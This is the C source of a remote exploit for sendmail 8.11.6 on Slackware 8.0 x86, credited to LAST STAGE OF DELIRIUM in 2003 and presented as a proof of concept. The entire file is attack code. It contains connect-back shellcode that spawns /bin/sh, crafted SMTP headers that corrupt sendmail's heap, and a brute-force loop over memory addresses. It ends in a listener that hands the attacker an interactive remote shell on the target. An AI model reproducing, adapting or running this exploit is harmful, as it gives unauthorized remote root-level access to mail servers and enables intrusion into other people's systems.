/*## copyright LAST STAGE OF DELIRIUM mar 2003 poland        *://lsd-pl.net/ #*/
/*## sendmail 8.11.6                                                         #*/

/* proof of concept code for remote sendmail vulnerability                    */
/* usage: linx86_sendmail target [-l localaddr] [-b localport] [-p ptr]       */
/*                               [-c count] [-t timeout] [-v 80]              */
/* where:                                                                     */
/*   target - address of the target host to run this code against             */
/*   localaddr - address of the host you are running this code from           */
/*   localport - local port that will listen for shellcode connection         */
/*   ptr - base ptr of the sendmail buffer containing our arbitrary data      */
/*   count - brute force loop counter                                         */
/*   timeout - select call timeout while waiting for shellcode connection     */
/*   v - version of the target OS (currently only Slackware 8.0 is supported) */
/*                                                                            */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

#define NOP  0xf8

#define MAXLINE 2048
#define PNUM    12

#define OFF1 (288+156-12)
#define OFF2 (1088+288+156+20+48)
#define OFF3 (139*2)

int tab[]={23,24,25,26};

#define IDX2PTR(i) (PTR+i-OFF1)
#define ALLOCBLOCK(idx,size) memset(&lookup[idx],1,size)

#define NOTVALIDCHAR(c) (((c)==0x00)||((c)==0x0d)||((c)==0x0a)||((c)==0x22)||\
                        (((c)&0x7f)==0x24)||(((c)>=0x80)&&((c)<0xa0)))

#define AOFF 33
#define AMSK 38
#define POFF 48
#define PMSK 53

char* lookup=NULL;
int   gfirst;

char shellcode[]=               /* 116 bytes                      */
    "\xeb\x02"                  /* jmp    <shellcode+4>           */
    "\xeb\x08"                  /* jmp    <shellcode+12>          */
    "\xe8\xf9\xff\xff\xff"      /* call   <shellcode+2>           */
    "\xcd\x7f"                  /* int    $0x7f                   */
    "\xc3"                      /* ret                            */
    "\x5f"                      /* pop    %edi                    */
    "\xff\x47\x01"              /* incl   0x1(%edi)               */
    "\x31\xc0"                  /* xor    %eax,%eax               */
    "\x50"                      /* push   %eax                    */
    "\x6a\x01"                  /* push   $0x1                    */
    "\x6a\x02"                  /* push   $0x2                    */
    "\x54"                      /* push   %esp                    */
    "\x59"                      /* pop    %ecx                    */
    "\xb0\x66"                  /* mov    $0x66,%al               */
    "\x31\xdb"                  /* xor    %ebx,%ebx               */
    "\x43"                      /* inc    %ebx                    */
    "\xff\xd7"                  /* call   *%edi                   */
    "\xba\xff\xff\xff\xff"      /* mov    $0xffffffff,%edx        */
    "\xb9\xff\xff\xff\xff"      /* mov    $0xffffffff,%ecx        */
    "\x31\xca"                  /* xor    %ecx,%edx               */
    "\x52"                      /* push   %edx                    */
    "\xba\xfd\xff\xff\xff"      /* mov    $0xfffffffd,%edx        */
    "\xb9\xff\xff\xff\xff"      /* mov    $0xffffffff,%ecx        */
    "\x31\xca"                  /* xor    %ecx,%edx               */
    "\x52"                      /* push   %edx                    */
    "\x54"                      /* push   %esp                    */
    "\x5e"                      /* pop    %esi                    */
    "\x6a\x10"                  /* push   $0x10                   */
    "\x56"                      /* push   %esi                    */
    "\x50"                      /* push   %eax                    */
    "\x50"                      /* push   %eax                    */
    "\x5e"                      /* pop    %esi                    */
    "\x54"                      /* push   %esp                    */
    "\x59"                      /* pop    %ecx                    */
    "\xb0\x66"                  /* mov    $0x66,%al               */
    "\x6a\x03"                  /* push   $0x3                    */
    "\x5b"                      /* pop    %ebx                    */
    "\xff\xd7"                  /* call   *%edi                   */
    "\x56"                      /* push   %esi                    */
    "\x5b"                      /* pop    %ebx                    */
    "\x31\xc9"                  /* xor    %ecx,%ecx               */
    "\xb1\x03"                  /* mov    $0x3,%cl                */
    "\x31\xc0"                  /* xor    %eax,%eax               */
    "\xb0\x3f"                  /* mov    $0x3f,%al               */
    "\x49"                      /* dec    %ecx                    */
    "\xff\xd7"                  /* call   *%edi                   */
    "\x41"                      /* inc    %ecx                    */
    "\xe2\xf6"                  /* loop   <shellcode+81>          */
    "\x31\xc0"                  /* xor    %eax,%eax               */
    "\x50"                      /* push   %eax                    */
    "\x68\x2f\x2f\x73\x68"      /* push   $0x68732f2f             */
    "\x68\x2f\x62\x69\x6e"      /* push   $0x6e69622f             */
    "\x54"                      /* push   %esp                    */
    "\x5b"                      /* pop    %ebx                    */
    "\x50"                      /* push   %eax                    */
    "\x53"                      /* push   %ebx                    */
    "\x54"                      /* push   %esp                    */
    "\x59"                      /* pop    %ecx                    */
    "\x31\xd2"                  /* xor    %edx,%edx               */
    "\xb0\x0b"                  /* mov    $0xb,%al                */
    "\xff\xd7"                  /* call   *%edi                   */
;

int PTR,MPTR=0xbfffa01c;

void putaddr(char* p,int i) {
 *p++=(i&0xff);
 *p++=((i>>8)&0xff);
 *p++=((i>>16)&0xff);
 *p++=((i>>24)&0xff);
}

void sendcommand(int sck,char *data,char resp) {
 char buf[1024];
 int i;
 if (send(sck,data,strlen(data),0)<0) {
  perror("error");exit(-1);
 }
 if (resp) {
  if ((i=recv(sck,buf,sizeof(buf),0))<0) {
   perror("error");exit(-1);
  }
  buf[i]=0;
  printf("%s",buf);
 }
}

int rev(int a){
 int i=1;
 if((*(char*)&i)) return(a);
 return((a>>24)&0xff)|(((a>>16)&0xff)<<8)|(((a>>8)&0xff)<<16)|((a&0xff)<<24);
}

void initlookup() {
 int i;
 if (!(lookup=(char*)malloc(MAXLINE))) {
  printf("error: malloc\n");exit(-1);
 }
 ALLOCBLOCK(0,MAXLINE);
 memset(lookup+OFF1,0,OFF2-OFF1);

 for(i=0;i<sizeof(tab)/4;i++)
  ALLOCBLOCK(OFF1+4*tab[i],4);

 gfirst=1;
}

int validaddr(int addr) {
 unsigned char buf[4],c;
 int i,*p=(int*)buf;
 *p=addr;
 for(i=0;i<4;i++) {
  c=buf[i];
  if (NOTVALIDCHAR(c)) return 0;
 }
 return 1;
}

int freeblock(int idx,int size) {
 int i,j;
 for(i=j=0;i<size;i++) {
  if (!lookup[idx+i]) j++;
 }
 return (i==j);
}

int findblock(int addr,int size,int begin) {
 int i,j,idx,ptr;
 ptr=addr;
 if (begin) {
  idx=OFF1+addr-PTR;
  while(1) {
   while(((!validaddr(ptr))||lookup[idx])&&(idx<OFF2)) {
    idx+=4;
    ptr+=4;
   }
   if (idx>=OFF2) return 0;
   if (freeblock(idx,size)) return idx;
   idx+=4;
   ptr+=4;
  }
 } else {
  idx=addr-PTR;
  while(1) {
   while(((!validaddr(ptr))||lookup[idx])&&(idx>OFF1)) {
    idx-=4;
    ptr-=4;
   }
   if (idx<OFF1) return 0;
   if (freeblock(idx,size)) return idx;
   idx-=4;
   ptr-=4;
  }
 }
}

int findsblock(int sptr) {
 int optr,sidx,size;

 size=gfirst ? 0x2c:0x04;
 optr=sptr;
 while(sidx=findblock(sptr,size,1)) {
  sptr=IDX2PTR(sidx);
  if (gfirst) {
   if (validaddr(sptr)) {
    ALLOCBLOCK(sidx,size);
    break;
   } else sptr=optr;
  } else {
   if (validaddr(sptr-0x18)&&freeblock(sidx-0x18,4)&&freeblock(sidx+0x0c,4)&&
       freeblock(sidx+0x10,4)&&freeblock(sidx-0x0e,4)) {
    ALLOCBLOCK(sidx-0x18,4);
    ALLOCBLOCK(sidx-0x0e,2);
    ALLOCBLOCK(sidx,4);
    ALLOCBLOCK(sidx+0x0c,4);
    ALLOCBLOCK(sidx+0x10,4);
    sidx-=0x18;
    break;
   } else sptr=optr;
  }
  sptr+=4;
  optr=sptr;
  }
 gfirst=0;
 return sidx;
}

int findfblock(int fptr,int i1,int i2,int i3) {
 int fidx,optr;
 optr=fptr;
 while(fidx=findblock(fptr,4,0)) {
  fptr=IDX2PTR(fidx);
  if (validaddr(fptr-i2)&&validaddr(fptr-i2-i3)&&freeblock(fidx-i3,4)&&
      freeblock(fidx-i2-i3,4)&&freeblock(fidx-i2-i3+i1,4)) {
   ALLOCBLOCK(fidx,4);
   ALLOCBLOCK(fidx-i3,4);
   ALLOCBLOCK(fidx-i2-i3,4);
   ALLOCBLOCK(fidx-i2-i3+i1,4);
   break;
  } else fptr=optr;
  fptr-=4;
  optr=fptr;
 }
 return fidx;
}

void findvalmask(char* val,char* mask,int len) {
 int i;
 unsigned char c,m;
 for(i=0;i<len;i++) {
  c=val[i];
  m=0xff;
  while(NOTVALIDCHAR(c^m)||NOTVALIDCHAR(m)) m--;
  val[i]=c^m;
  mask[i]=m;
 }
}

void initasmcode(char *addr,int port) {
 char abuf[4],amask[4],pbuf[2],pmask[2];
 char name[256];
 struct hostent *hp;
 int i;

 if (!addr) gethostname(name,sizeof(name));
  else strcpy(name,addr);

 if ((i=inet_addr(name))==-1) {
  if ((hp=gethostbyname(name))==NULL) {
   printf("error: address\n");exit(-1);
  }
  memcpy(&i,hp->h_addr,4);
 }

 putaddr(abuf,rev(i));

 pbuf[0]=(port>>8)&0xff;
 pbuf[1]=(port)&0xff;

 findvalmask(abuf,amask,4);
 findvalmask(pbuf,pmask,2);

 memcpy(&shellcode[AOFF],abuf,4);
 memcpy(&shellcode[AMSK],amask,4);
 memcpy(&shellcode[POFF],pbuf,2);
 memcpy(&shellcode[PMSK],pmask,2);
}

int main(int argc,char **argv){
    int sck,srv,i,j,cnt,jidx,aidx,sidx,fidx,aptr,sptr,fptr,ssize,fsize,jmp;
    int c,l,i1,i2,i3,i4,found,vers=80,count=256,timeout=1,port=25;
    fd_set readfs;
    struct timeval t;
    struct sockaddr_in address;
    struct hostent *hp;
    char buf[4096],cmd[4096];
    char *p,*host,*myhost=NULL;

    printf("copyright LAST STAGE OF DELIRIUM mar 2003 poland //lsd-pl.net/\n");
    printf("sendmail 8.11.6 for Slackware 8.0 x86\n\n");

    if (argc<3) {
     printf("usage: %s target [-l localaddr] [-b localport] [-p ptr] [-c count] [-t timeout] [-v 80]\n",argv[0]);
     exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"b:c:l:p:t:v:"))!=-1) {
     switch(c) {
      case 'b': port=atoi(optarg);break;
      case 'c': count=atoi(optarg);break;
      case 'l': myhost=optarg;break;
      case 't': timeout=atoi(optarg);break;
      case 'v': vers=atoi(optarg);break;
      case 'p': sscanf(optarg,"%x",&MPTR);
     }
    }

    host=argv[1];

    srv=socket(AF_INET,SOCK_STREAM,0);
    bzero(&address,sizeof(address));
    address.sin_family=AF_INET;
    address.sin_port=htons(port);
    if (bind(srv,(struct sockaddr*)&address,sizeof(address))==-1) {
     printf("error: bind\n");exit(-1);
    }
    if (listen(srv,10)==-1) {
     printf("error: listen\n");exit(-1);
    }

    initasmcode(myhost,port);

    for(i4=0;i4<count;i4++,MPTR+=cnt*4) {
     PTR=MPTR;
     sck=socket(AF_INET,SOCK_STREAM,0);
     bzero(&address,sizeof(address));
     address.sin_family=AF_INET;
     address.sin_port=htons(25);
     if ((address.sin_addr.s_addr=inet_addr(host))==-1) {
      if ((hp=gethostbyname(host))==NULL) {
       printf("error: address\n");exit(-1);
      }
      memcpy(&address.sin_addr.s_addr,hp->h_addr,4);
     }
     if (connect(sck,(struct sockaddr*)&address,sizeof(address))==-1) {
      printf("error: connect\n");exit(-1);
     }
     initlookup();

     sendcommand(sck,"helo yahoo.com\n",0);
     sendcommand(sck,"mail from: anonymous@yahoo.com\n",0);
     sendcommand(sck,"rcpt to: lp\n",0);
     sendcommand(sck,"data\n",0);

     aidx=findblock(PTR,PNUM*4,1);
     ALLOCBLOCK(aidx,PNUM*4);
     aptr=IDX2PTR(aidx);

     printf(".");fflush(stdout);

     jidx=findblock(PTR,strlen(shellcode)+PNUM*4,1);
     ALLOCBLOCK(jidx,strlen(shellcode)+PNUM*4);

     switch(vers) {
      case 80: l=28;i1=0x46;i2=0x94;i3=0x1c;break;
      default: exit(-1);
     }

     i2-=8;

     p=buf;
     for(i=0;i<138;i++) {
      *p++='<';*p++='>';
     }
     *p++='(';
     for(i=0;i<l;i++) *p++=NOP;
     *p++=')';
     *p++=0;

     putaddr(&buf[OFF3+l],aptr);
     sprintf(cmd,"From: %s\n",buf);
     sendcommand(sck,cmd,0);
     sendcommand(sck,"Subject: hello\n",0);
     memset(cmd,NOP,MAXLINE);
     cmd[MAXLINE-2]='\n';
     cmd[MAXLINE-1]=0;

     cnt=0;

     while(cnt<PNUM) {
      sptr=aptr;
      fptr=IDX2PTR(OFF2);

      if (!(sidx=findsblock(sptr))) break;
      sptr=IDX2PTR(sidx);
      if (!(fidx=findfblock(fptr,i1,i2,i3))) break;
      fptr=IDX2PTR(fidx);

      jmp=IDX2PTR(jidx);
      while (!validaddr(jmp)) jmp+=4;

      putaddr(&cmd[aidx],sptr);
      putaddr(&cmd[sidx+0x24],aptr);
      putaddr(&cmd[sidx+0x28],aptr);
      putaddr(&cmd[sidx+0x18],fptr-i2-i3);

      putaddr(&cmd[fidx-i2-i3],0x01010101);
      putaddr(&cmd[fidx-i2-i3+i1],0xfffffff8);

      putaddr(&cmd[fidx-i3],fptr-i3);
      putaddr(&cmd[fidx],jmp);

      aidx+=4;
      PTR-=4;
      cnt++;
     }

     p=&cmd[jidx+4*PNUM];
      for(i=0;i<strlen(shellcode);i++) {
      *p++=shellcode[i];
     }
     sendcommand(sck,cmd,0);
     sendcommand(sck,"\n",0);
     sendcommand(sck,".\n",0);
     free(lookup);

     FD_ZERO(&readfs);
     FD_SET(0,&readfs);
     FD_SET(srv,&readfs);

     t.tv_sec=timeout;
     t.tv_usec=0;

     if (select(srv+1,&readfs,NULL,NULL,&t)>0) {
      close(sck);
      found=1;
      if ((sck=accept(srv,(struct sockaddr*)&address,&l))==-1) {
        printf("error: accept\n");exit(-1);
      }
      close(srv);

      printf("\nbase 0x%08x mcicache 0x%08x\n",PTR,aptr);

      write(sck,"/bin/uname -a\n",14);
     } else {
      close(sck);
      found=0;
     }

     while(found){
        FD_ZERO(&readfs);
        FD_SET(0,&readfs);
        FD_SET(sck,&readfs);
        if(select(sck+1,&readfs,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&readfs)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                     else {printf("koniec\n");exit(-1);}
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&readfs)){
                if((cnt=read(sck,buf,1024))<1){
                     if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                     else {printf("koniec\n");exit(-1);}
                }
                write(1,buf,cnt);
            }
        }
    }
  }
}
